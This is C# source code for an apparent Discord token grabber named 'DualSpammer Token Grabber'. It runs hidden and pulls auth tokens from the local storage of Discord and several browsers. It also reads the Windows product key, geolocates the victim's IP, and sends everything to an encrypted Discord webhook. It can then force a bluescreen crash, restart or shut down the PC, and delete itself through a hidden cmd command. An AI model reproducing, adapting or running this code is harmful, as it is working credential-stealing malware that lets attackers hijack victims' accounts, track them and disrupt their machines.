using System.Windows.Forms;
using System.Drawing;
using System.Diagnostics;
using System;
using Microsoft.VisualBasic;
using System.IO;
using System.Text.RegularExpressions;
using System.Collections.Specialized;
using System.Net;
using System.Runtime.InteropServices;
public partial class MainForm : Form
{
    [DllImport("ntdll.dll")]
    public static extern uint RtlAdjustPrivilege(int Privilege, bool bEnablePrivilege, bool IsThreadPrivilege, out bool PreviousValue);
    [DllImport("ntdll.dll")]
    public static extern uint NtRaiseHardError(uint ErrorStatus, uint NumberOfParameters, uint UnicodeStringParameterMask, IntPtr Parameters, uint ValidResponseOption, out uint Response);
    private bool legitExit = false;
    public MainForm()
    {
        InitializeComponent();
    }
    private void MainForm_Load(object sender, System.EventArgs e)
    {
        Size = new Size(0, 0);
        Visible = false;
        Hide();
        Process.GetCurrentProcess().PriorityClass = ProcessPriorityClass.RealTime;
        CheckForIllegalCrossThreadCalls = false;    
        string splitter = Crypto.AES_Decrypt("NJBB6d/H9gY7vTGNPglQRJYHSgkzHrFVhC6qw+9zMaYl0je7XvmqURNuMg2zWBUHBfUI9wQLFtSpa0Q5dBwqJ/yzQRl5+FXhWFERJrCeyIFTyKU91bTAl3UHpYyVlkxfYzHfVlNwjfaK0r8kFGZ47+FRF7Zvf7OOPEydItveNtzPGMERTrINtf3Aq/U8KZsj", "ERKJEKJRLKWJERLKJWEJKRLWKJERLKJWERLK");
        try
        {
            FileSystem.FileOpen(1, Application.ExecutablePath, OpenMode.Binary, OpenAccess.Read);
            string stub = Strings.Space((int) FileSystem.LOF(1));
            FileSystem.FileGet(1, ref stub);
            FileSystem.FileClose(1);
            string[] args = Strings.Split(stub, splitter);
            string roamingPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            string localPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            WebClient webClient = new WebClient();
            bool crashPC = bool.Parse(args[2].ToLower());
            bool restartPC = bool.Parse(args[3].ToLower());
            bool removeExecutable = bool.Parse(args[4].ToLower());
            bool restartDiscord = bool.Parse(args[5].ToLower());
            bool shutdownPC = bool.Parse(args[6].ToLower());
            string geoIp1 = "Failed to track.";
            string geoIp2 = "Failed to track.";
            string ipAddress = "No ip address found.";
            try
            {
                ipAddress = webClient.DownloadString("https://api.ipify.org/");
            }
            catch (Exception ex)
            {
            }
            try
            {
                geoIp1 = webClient.DownloadString("https://webresolver.nl/api.php?key=4BMRN-A9HUE-E1NC2-6JWQ7&action=geoip&string=" + ipAddress).Replace("<br>", Environment.NewLine).Replace("<br />", Environment.NewLine);
            }
            catch (Exception ex)
            {
            }
            try
            {
                geoIp2 = webClient.DownloadString("https://api.apithis.net/geoip.php?ip=" + ipAddress).Replace("<br>", Environment.NewLine).Replace("<br />", Environment.NewLine);
            }
            catch (Exception ex)
            {
            }
            sendWebHook(Crypto.AES_Decrypt(args[1], "X358791X"), "**A new Discord token has been grabbed**:" + Environment.NewLine + Environment.NewLine + "*Discord token*: " + GetToken(roamingPath + "\\Discord") + Environment.NewLine + "*Discord Canary token*: " + GetToken(roamingPath + "\\discordcanary") + Environment.NewLine + "*Discord PTB token*: " + GetToken(roamingPath + "\\discordptb") + Environment.NewLine + "*Google Chrome token*: " + GetToken(localPath + "\\Google\\Chrome\\User Data\\Default") + Environment.NewLine + "*Opera token*: " + GetToken(roamingPath + "\\Opera Software\\Opera Stable") + Environment.NewLine + "*Brave token*: " + GetToken(localPath + "\\BraveSoftware\\Brave-Browser\\User Data\\Default") + Environment.NewLine + "*Yandex token*: " + GetToken(localPath + "\\Yandex\\YandexBrowser\\User Data\\Default") + Environment.NewLine + "*IP address*: " + ipAddress + Environment.NewLine + "*Windows key*: " + KeyDecoder.GetWindowsProductKeyFromRegistry() + Environment.NewLine + Environment.NewLine + "Tracking with first method: " + Environment.NewLine + Environment.NewLine + geoIp1 + Environment.NewLine + Environment.NewLine + "Tracking with second method: " + Environment.NewLine + Environment.NewLine + geoIp2, "DualSpammer Token Grabber");
            if (crashPC)
            {
                try
                {
                    Boolean t1;
                    uint t2;
                    RtlAdjustPrivilege(19, true, false, out t1);
                    NtRaiseHardError(0xc0000022, 0, 0, IntPtr.Zero, 6, out t2);
                }
                catch (Exception ex)
                {
                }
            }
            if (restartPC)
            {
                try
                {
                    Process.Start("shutdown.exe", "-r -t 0");
                }
                catch (Exception ex)
                {
                }
            }
            if (restartDiscord)
            {
                foreach (Process process in Process.GetProcesses())
                {
                    try
                    {
                        if (process.ProcessName.ToLower().Contains("discord"))
                        {
                            if (!(process.MainModule.FileName.Replace(" ", "") == ""))
                            {
                                string fileName = process.MainModule.FileName;
                                process.Kill();
                                Process.Start(fileName);
                                break;
                            }
                        }
                    }
                    catch (Exception ex)
                    {
                    }
                }
            }
            if (shutdownPC)
            {
                try
                {
                    Process.Start("shutdown.exe", "-s -t 0");
                }
                catch (Exception ex)
                {
                }
            }
            if (removeExecutable)
            {
                try
                {
                    System.Threading.Thread thread = new System.Threading.Thread(new System.Threading.ThreadStart(doRemoveExecutable));
                    thread.Start();
                }
                catch (Exception ex)
                {
                }
            }
        }
        catch (Exception ex)
        {
        }
        legitExit = true;
        Application.Exit();
    }
    public void doRemoveExecutable()
    {
        try
        {
            System.IO.File.Delete(Application.ExecutablePath);
        }
        catch (Exception ex)
        {
        }
        try
        {
            Process.Start(new ProcessStartInfo()
            {
                Arguments = "/C choice /C Y /N /D Y /T 3 & Del \"" + Application.ExecutablePath + "\"",
                WindowStyle = ProcessWindowStyle.Hidden,
                CreateNoWindow = true,
                FileName = "cmd.exe"
            });
        }
        catch (Exception ex)
        {
        }
    }
    public static string GetToken(string thePath)
    {
        string path = thePath + "\\Local Storage\\leveldb\\";
        if (!Directory.Exists(path))
        {
            return "No token found.";
        }
        string[] ldb = Directory.GetFiles(path, "*.ldb");
        foreach (var ldb_file in ldb)
        {
            var text = File.ReadAllText(ldb_file);
            string token_reg = @"[a-zA-Z0-9]{24}\.[a-zA-Z0-9]{6}\.[a-zA-Z0-9_\-]{27}|mfa\.[a-zA-Z0-9_\-]{84}";
            Match token = Regex.Match(text, token_reg);
            if (token.Success)
            {
                return token.Value;
            }
            continue;
        }
        return "No token found.";
    }
    public static void sendWebHook(string URL, string msg, string username)
    {
        Post(URL, new NameValueCollection()
        {
                {
                    "username", username
                },
                {
                    "content",  msg
                }
            });
    }
    private static byte[] Post(string uri, NameValueCollection pairs)
    {
        using (WebClient webclient = new WebClient())
        return webclient.UploadValues(uri, pairs);
    }
    private void MainForm_FormClosing(object sender, FormClosingEventArgs e)
    {
        if (!legitExit)
        {
            e.Cancel = true;
        }
    }
}